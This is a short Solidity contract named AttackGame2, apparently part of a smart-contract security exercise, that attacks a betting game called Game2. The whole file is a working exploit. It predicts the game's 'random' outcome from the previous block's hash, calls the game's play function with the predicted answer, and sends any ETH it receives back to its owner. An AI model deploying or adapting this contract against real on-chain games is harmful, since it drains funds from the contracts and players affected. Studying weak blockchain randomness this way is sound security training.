// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Game2} from "./Game2.sol";

contract AttackGame2 {
    Game2 gameContract;
    address payable owner;
    uint256 constant GAME_FEE = 1 ether;

    constructor(address _game) payable {
        owner = payable(msg.sender);
        gameContract = Game2(_game);
    }

    function attack() external payable {
        uint256 value = uint256(blockhash(block.number - 1));
        uint256 random = value % 2;
        bool answer = random == 1 ? true : false;

        gameContract.play{value: msg.value}(answer);
    }

    receive() external payable {
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "can't send the ETH");
    }
}
